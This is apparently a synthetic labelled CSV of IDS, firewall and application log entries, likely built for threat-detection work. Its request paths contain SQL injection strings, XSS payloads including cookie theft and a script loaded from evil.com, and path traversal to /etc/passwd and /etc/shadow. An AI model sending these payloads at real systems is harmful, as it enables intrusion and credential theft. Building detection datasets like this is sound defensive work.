timestamp,source_ip,dest_ip,protocol,action,threat_label,log_type,bytes_transferred,user_agent,request_path
2024-05-03T05:38:48,192.168.1.231,192.168.1.251,HTTP,blocked,suspicious,ids,915,sqlmap/1.7,/admin/
2024-05-01T14:57:12,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,648,python-requests/2.28.0,/admin/login.php
2024-05-01T14:42:12,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,280,python-requests/2.28.0,/admin/login.php
2024-05-02T17:59:08,192.168.1.239,192.168.1.253,UDP,allowed,benign,application,34244,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/
2024-05-02T11:30:45,192.168.1.107,192.168.1.236,HTTP,blocked,malicious,ids,390,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/post?title=javascript:alert(document.domain)
2024-05-02T10:54:15,192.168.1.20,192.168.1.166,HTTP,allowed,malicious,ids,1047,python-requests/2.28.0,/login?pass=admin' OR 'x'='x
2024-05-01T14:56:39,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,762,python-requests/2.28.0,/admin/login.php
2024-05-02T18:59:27,192.168.1.189,192.168.1.36,TCP,allowed,benign,application,15158,curl/7.85,/index.php
2024-05-03T01:34:49,192.168.1.248,192.168.1.186,TCP,allowed,malicious,ids,444,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/comment?text=</script><script>document.cookie
2024-05-02T23:31:23,192.168.1.92,192.168.1.40,HTTP,allowed,benign,ids,24157,python-requests/2.28.0,/dashboard
2024-05-02T18:08:55,192.168.1.73,192.168.1.65,HTTP,allowed,malicious,ids,266,python-requests/2.28.0,/product?id=1 UNION SELECT * FROM users
2024-05-01T14:24:48,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,3451516,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-03T02:27:22,192.168.1.248,192.168.1.118,ICMP,allowed,benign,application,1508,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/dashboard
2024-05-01T14:46:51,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,417,python-requests/2.28.0,/admin/login.php
2024-05-02T09:53:29,192.168.1.56,192.168.1.194,HTTP,allowed,malicious,ids,980,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/items?category=1 AND 1=1
2024-05-02T07:53:51,192.168.1.166,192.168.1.76,TCP,allowed,malicious,ids,1227,curl/7.85,/files/../../etc/passwd
2024-05-03T03:04:23,192.168.1.103,192.168.1.129,HTTP,blocked,malicious,ids,179,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/search?q=1' AND '1'='1
2024-05-01T14:24:46,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,2957473,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-01T14:57:48,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,679,python-requests/2.28.0,/admin/login.php
2024-05-01T14:47:09,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,342,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:18,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,500,python-requests/2.28.0,/admin/login.php
2024-05-03T02:26:37,192.168.1.31,192.168.1.223,UDP,allowed,benign,application,19653,curl/7.85,/
2024-05-01T14:00:20,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,2697010,curl/7.85,/upload
2024-05-03T10:41:08,192.168.1.74,192.168.1.119,HTTP,allowed,benign,firewall,22211,curl/7.85,/ftp
2024-05-01T14:00:06,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,3686849,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-02T17:33:11,192.168.1.79,192.168.1.188,TCP,blocked,malicious,ids,463,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-01T14:24:16,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,1744839,curl/7.85,/upload
2024-05-02T22:27:08,192.168.1.62,192.168.1.232,ICMP,allowed,benign,application,16079,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-01T20:06:46,192.168.1.165,192.168.1.110,TCP,allowed,suspicious,ids,472,Nmap Scripting Engine,/wp-admin/
2024-05-02T17:46:25,192.168.1.102,192.168.1.211,TCP,allowed,benign,ids,10344,python-requests/2.28.0,/dashboard
2024-05-03T13:44:19,192.168.1.201,192.168.1.249,HTTP,blocked,malicious,ids,1295,curl/7.85,/product?id=1 UNION SELECT * FROM users
2024-05-02T19:35:39,192.168.1.125,192.168.1.124,TCP,allowed,suspicious,ids,1948,nikto/2.1.6,/wp-admin/
2024-05-03T05:56:37,192.168.1.114,192.168.1.35,ICMP,allowed,benign,firewall,30020,python-requests/2.28.0,/ftp
2024-05-02T19:58:47,192.168.1.158,192.168.1.176,TCP,blocked,malicious,ids,277,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/img/../../../../etc/hosts
2024-05-01T21:58:52,192.168.1.251,192.168.1.107,TCP,blocked,malicious,ids,1322,curl/7.85,/items?category=1 AND 1=1
2024-05-01T14:57:39,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,767,python-requests/2.28.0,/admin/login.php
2024-05-01T14:41:15,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,363,python-requests/2.28.0,/admin/login.php
2024-05-03T00:29:49,192.168.1.133,192.168.1.117,HTTP,blocked,malicious,ids,771,python-requests/2.28.0,/search?q=1' AND '1'='1
2024-05-02T20:15:21,192.168.1.45,192.168.1.52,TCP,allowed,suspicious,ids,1187,sqlmap/1.7,/phpinfo.php
2024-05-03T12:06:40,192.168.1.111,192.168.1.212,SSH,allowed,benign,application,15875,python-requests/2.28.0,/dashboard
2024-05-03T07:32:12,192.168.1.253,192.168.1.113,TCP,allowed,malicious,ids,882,python-requests/2.28.0,/login?pass=admin' OR 'x'='x
2024-05-01T15:23:21,192.168.1.75,192.168.1.223,UDP,allowed,benign,firewall,25049,python-requests/2.28.0,/login
2024-05-01T21:57:50,192.168.1.197,192.168.1.64,TCP,blocked,malicious,ids,1425,python-requests/2.28.0,/page?name=<script>alert(1)</script>
2024-05-01T14:24:24,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,1683283,python-requests/2.28.0,/upload
2024-05-01T14:04:44,192.168.1.55,192.168.1.123,HTTP,blocked,malicious,ids,1315,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-02T13:21:08,192.168.1.185,192.168.1.17,ICMP,allowed,benign,ids,12543,python-requests/2.28.0,/index.html
2024-05-01T14:57:42,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,435,python-requests/2.28.0,/admin/login.php
2024-05-01T14:57:45,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,590,python-requests/2.28.0,/admin/login.php
2024-05-02T11:50:13,192.168.1.97,192.168.1.48,TCP,blocked,malicious,ids,561,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/comment?text=</script><script>document.cookie
2024-05-01T14:00:28,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,4545945,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/upload
2024-05-01T14:47:06,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,471,python-requests/2.28.0,/admin/login.php
2024-05-02T02:12:47,192.168.1.186,192.168.1.176,SSH,allowed,benign,ids,4611,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ftp
2024-05-01T19:16:53,192.168.1.96,192.168.1.181,TCP,blocked,malicious,ids,789,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-02T17:38:54,192.168.1.230,192.168.1.251,TCP,allowed,malicious,ids,399,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search?q=1 OR 1=1
2024-05-01T14:59:15,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,531,python-requests/2.28.0,/admin/login.php
2024-05-02T03:03:13,192.168.1.28,192.168.1.236,HTTP,blocked,malicious,ids,593,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/post?title=javascript:alert(document.domain)
2024-05-01T14:24:12,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,3857052,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-01T14:45:15,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,438,python-requests/2.28.0,/admin/login.php
2024-05-02T12:11:46,192.168.1.44,192.168.1.253,SSH,allowed,benign,application,29080,python-requests/2.28.0,/index.php
2024-05-03T03:28:18,192.168.1.212,192.168.1.253,TCP,allowed,suspicious,ids,946,gobuster/3.1,/wp-admin/
2024-05-01T22:15:39,192.168.1.7,192.168.1.189,HTTP,allowed,malicious,ids,1160,curl/7.85,/login?pass=admin' OR 'x'='x
2024-05-01T14:57:00,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,405,python-requests/2.28.0,/admin/login.php
2024-05-03T06:38:19,192.168.1.77,192.168.1.58,TCP,allowed,malicious,ids,524,curl/7.85,/search?q=1' AND '1'='1
2024-05-03T13:09:33,192.168.1.39,192.168.1.233,HTTP,blocked,suspicious,ids,246,nikto/2.1.6,/wp-admin/
2024-05-02T05:41:55,192.168.1.118,192.168.1.212,HTTP,allowed,benign,application,22246,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ftp
2024-05-02T07:23:21,192.168.1.147,192.168.1.99,TCP,allowed,suspicious,ids,189,nikto/2.1.6,/admin/
2024-05-02T07:10:07,192.168.1.99,192.168.1.21,TCP,blocked,malicious,ids,157,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login?user=admin'--
2024-05-01T23:31:19,192.168.1.195,192.168.1.95,HTTP,allowed,malicious,ids,595,curl/7.85,/login?user=admin'--
2024-05-01T20:38:38,192.168.1.121,192.168.1.90,HTTP,allowed,suspicious,ids,757,gobuster/3.1,/robots.txt
2024-05-01T14:58:12,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,726,python-requests/2.28.0,/admin/login.php
2024-05-01T14:45:00,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,271,python-requests/2.28.0,/admin/login.php
2024-05-02T04:23:59,192.168.1.232,192.168.1.166,TCP,blocked,malicious,ids,288,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/download?file=../../../etc/shadow
2024-05-02T11:58:45,192.168.1.2,192.168.1.77,HTTP,allowed,benign,firewall,20737,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/admin/login.php
2024-05-01T14:51:46,192.168.1.5,192.168.1.136,TCP,allowed,malicious,ids,135,python-requests/2.28.0,/update?field=vbscript:msgbox(1)
2024-05-02T05:20:00,192.168.1.43,192.168.1.102,TCP,allowed,benign,firewall,4280,curl/7.85,/
2024-05-03T05:05:42,192.168.1.48,192.168.1.94,TCP,blocked,malicious,ids,1037,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/post?title=javascript:alert(document.domain)
2024-05-01T14:42:00,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,670,python-requests/2.28.0,/admin/login.php
2024-05-02T04:10:51,192.168.1.9,192.168.1.201,ICMP,allowed,benign,application,33904,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.php
2024-05-02T09:51:50,192.168.1.116,192.168.1.232,HTTP,allowed,malicious,ids,287,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/query?val=1/*comment*/OR/**/1=1
2024-05-03T09:14:22,192.168.1.158,192.168.1.51,TCP,blocked,malicious,ids,377,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?name=<script>alert(1)</script>
2024-05-03T07:08:31,192.168.1.63,192.168.1.254,HTTP,allowed,malicious,ids,1500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/page?name=<script>alert(1)</script>
2024-05-01T18:32:02,192.168.1.53,192.168.1.214,HTTP,allowed,suspicious,ids,1953,gobuster/3.1,/phpinfo.php
2024-05-01T14:42:09,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,587,python-requests/2.28.0,/admin/login.php
2024-05-02T06:15:38,192.168.1.229,192.168.1.198,ICMP,allowed,benign,application,19170,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.html
2024-05-03T07:41:35,192.168.1.243,192.168.1.180,HTTP,blocked,malicious,ids,138,curl/7.85,/search?q=1' AND '1'='1
2024-05-02T01:49:58,192.168.1.101,192.168.1.254,TCP,allowed,malicious,ids,1138,python-requests/2.28.0,/login?pass=admin' OR 'x'='x
2024-05-01T14:57:33,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,363,python-requests/2.28.0,/admin/login.php
2024-05-01T20:01:15,192.168.1.128,192.168.1.217,TCP,allowed,malicious,ids,1258,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/page?name=<script>alert(1)</script>
2024-05-01T14:41:57,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,244,python-requests/2.28.0,/admin/login.php
2024-05-01T21:27:44,192.168.1.158,192.168.1.223,ICMP,allowed,benign,firewall,25586,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/admin/login.php
2024-05-01T14:24:42,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,4755927,curl/7.85,/upload
2024-05-02T02:38:57,192.168.1.46,192.168.1.61,TCP,allowed,malicious,ids,1311,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-03T07:15:55,192.168.1.214,192.168.1.218,TCP,allowed,malicious,ids,886,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/search?q=<script src='http://evil.com/x.js'>
2024-05-02T11:49:38,192.168.1.124,192.168.1.201,HTTP,allowed,malicious,ids,615,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-03T03:06:08,192.168.1.49,192.168.1.192,TCP,allowed,malicious,ids,1423,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/static/..%2F..%2Fetc%2Fpasswd
2024-05-02T05:02:44,192.168.1.209,192.168.1.53,HTTP,allowed,malicious,ids,1190,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/comment?text=</script><script>document.cookie
2024-05-02T16:38:44,192.168.1.48,192.168.1.128,UDP,allowed,benign,firewall,27565,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ssh
2024-05-03T11:02:54,192.168.1.87,192.168.1.239,TCP,allowed,benign,firewall,23399,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login
2024-05-02T20:29:09,192.168.1.248,192.168.1.42,HTTP,blocked,malicious,ids,612,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/query?val=1/*comment*/OR/**/1=1
2024-05-02T00:36:00,192.168.1.63,192.168.1.136,HTTP,blocked,suspicious,ids,448,gobuster/3.1,/login
2024-05-01T14:00:24,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,2439346,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/upload
2024-05-02T00:59:07,192.168.1.246,192.168.1.16,TCP,blocked,malicious,ids,803,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?pass=admin' OR 'x'='x
2024-05-03T08:22:19,192.168.1.149,192.168.1.104,ICMP,allowed,benign,firewall,2502,python-requests/2.28.0,/admin/login.php
2024-05-02T03:07:59,192.168.1.200,192.168.1.21,UDP,allowed,benign,ids,11688,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/
2024-05-01T18:02:13,192.168.1.128,192.168.1.220,HTTP,allowed,malicious,ids,422,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/download?file=../../../etc/shadow
2024-05-01T14:42:06,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,327,python-requests/2.28.0,/admin/login.php
2024-05-03T02:19:24,192.168.1.2,192.168.1.136,TCP,allowed,benign,application,28464,python-requests/2.28.0,/index.html
2024-05-02T07:31:02,192.168.1.147,192.168.1.107,HTTP,blocked,malicious,ids,1172,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login?user=admin'--
2024-05-01T22:50:14,192.168.1.253,192.168.1.52,HTTP,blocked,malicious,ids,1111,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1' AND '1'='1
2024-05-03T07:55:13,192.168.1.98,192.168.1.123,TCP,allowed,suspicious,ids,711,Nmap Scripting Engine,/.git/
2024-05-02T20:29:40,192.168.1.39,192.168.1.106,HTTP,allowed,malicious,ids,1127,python-requests/2.28.0,/query?val=1/*comment*/OR/**/1=1
2024-05-02T08:10:56,192.168.1.215,192.168.1.159,SSH,allowed,benign,firewall,7091,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login
2024-05-02T01:58:54,192.168.1.66,192.168.1.234,HTTP,allowed,suspicious,ids,1628,sqlmap/1.7,/admin/
2024-05-02T08:36:06,192.168.1.44,192.168.1.16,SSH,allowed,benign,firewall,17878,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.html
2024-05-02T03:06:21,192.168.1.197,192.168.1.35,TCP,allowed,malicious,ids,883,curl/7.85,/update?field=vbscript:msgbox(1)
2024-05-03T09:24:53,192.168.1.40,192.168.1.96,TCP,allowed,benign,firewall,10434,curl/7.85,/login
2024-05-02T09:00:47,192.168.1.45,192.168.1.105,ICMP,allowed,benign,firewall,4843,python-requests/2.28.0,/admin/login.php
2024-05-02T23:49:10,192.168.1.53,192.168.1.88,HTTP,allowed,malicious,ids,753,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api?filter=SELECT username FROM users
2024-05-01T14:57:33,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,546,python-requests/2.28.0,/admin/login.php
2024-05-01T14:45:51,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,375,python-requests/2.28.0,/admin/login.php
2024-05-01T18:15:31,192.168.1.149,192.168.1.189,TCP,allowed,suspicious,ids,217,nikto/2.1.6,/wp-admin/
2024-05-02T14:57:22,192.168.1.47,192.168.1.30,UDP,allowed,benign,ids,30019,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ftp
2024-05-02T17:35:45,192.168.1.1,192.168.1.253,HTTP,allowed,suspicious,ids,1997,nikto/2.1.6,/.git/
2024-05-02T02:10:21,192.168.1.249,192.168.1.55,HTTP,blocked,malicious,ids,187,curl/7.85,/download?file=../../../etc/shadow
2024-05-02T02:00:23,192.168.1.243,192.168.1.233,UDP,allowed,benign,firewall,15069,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.php
2024-05-02T08:04:15,192.168.1.69,192.168.1.41,TCP,allowed,suspicious,ids,1886,gobuster/3.1,/wp-admin/
2024-05-02T09:53:42,192.168.1.32,192.168.1.205,TCP,allowed,malicious,ids,919,curl/7.85,/api?filter=SELECT username FROM users
2024-05-02T20:59:03,192.168.1.191,192.168.1.141,HTTP,allowed,suspicious,ids,1539,sqlmap/1.7,/.git/
2024-05-01T14:40:45,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,717,python-requests/2.28.0,/admin/login.php
2024-05-03T02:48:51,192.168.1.218,192.168.1.121,UDP,allowed,benign,firewall,5006,curl/7.85,/ssh
2024-05-02T14:39:08,192.168.1.209,192.168.1.165,HTTP,allowed,malicious,ids,1080,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/product?id=1 UNION SELECT * FROM users
2024-05-01T14:41:39,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,294,python-requests/2.28.0,/admin/login.php
2024-05-02T03:00:10,192.168.1.149,192.168.1.247,HTTP,blocked,suspicious,ids,322,sqlmap/1.7,/phpinfo.php
2024-05-01T14:58:21,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,697,python-requests/2.28.0,/admin/login.php
2024-05-01T14:56:51,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,633,python-requests/2.28.0,/admin/login.php
2024-05-01T14:59:00,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,582,python-requests/2.28.0,/admin/login.php
2024-05-02T14:04:46,192.168.1.42,192.168.1.188,TCP,allowed,malicious,ids,481,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1' AND '1'='1
2024-05-03T04:30:32,192.168.1.33,192.168.1.187,HTTP,blocked,malicious,ids,146,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-03T13:02:31,192.168.1.172,192.168.1.109,TCP,blocked,malicious,ids,842,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/product?id=1 UNION SELECT * FROM users
2024-05-02T17:18:31,192.168.1.168,192.168.1.53,SSH,allowed,benign,ids,23841,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.php
2024-05-03T12:09:29,192.168.1.200,192.168.1.162,UDP,allowed,benign,firewall,20074,python-requests/2.28.0,/
2024-05-01T21:29:09,192.168.1.38,192.168.1.66,HTTP,blocked,malicious,ids,1333,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login?user=admin'--
2024-05-02T18:30:55,192.168.1.218,192.168.1.198,HTTP,blocked,malicious,ids,1333,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-01T14:00:08,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,2095329,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-03T13:22:14,192.168.1.52,192.168.1.194,TCP,allowed,malicious,ids,684,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?user=admin'--
2024-05-03T03:39:46,192.168.1.201,192.168.1.211,TCP,blocked,malicious,ids,861,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/assets/..%5C..%5Cwindows%5Csystem32
2024-05-02T00:53:26,192.168.1.156,192.168.1.25,HTTP,allowed,benign,ids,2658,python-requests/2.28.0,/login
2024-05-02T18:17:01,192.168.1.63,192.168.1.66,HTTP,allowed,malicious,ids,1424,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-01T14:58:51,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,719,python-requests/2.28.0,/admin/login.php
2024-05-02T13:33:50,192.168.1.240,192.168.1.64,HTTP,allowed,malicious,ids,885,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/query?val=1/*comment*/OR/**/1=1
2024-05-02T22:58:30,192.168.1.207,192.168.1.35,HTTP,allowed,benign,ids,33673,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ssh
2024-05-01T14:24:08,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,2149144,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
